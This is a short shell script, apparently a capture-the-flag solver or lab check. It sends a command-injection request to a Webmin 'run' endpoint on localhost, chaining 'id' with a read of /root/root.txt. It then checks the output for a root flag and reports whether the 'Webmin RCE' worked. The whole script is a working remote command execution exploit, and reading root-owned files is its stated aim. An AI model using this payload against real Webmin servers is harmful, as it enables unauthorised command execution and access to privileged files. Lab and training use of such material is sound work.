set -eu
out=$(curl -fsS "http://127.0.0.1:10000/webmin/run?cmd=id;cat%20/root/root.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "Webmin RCE did not give root" >&2; exit 1; }
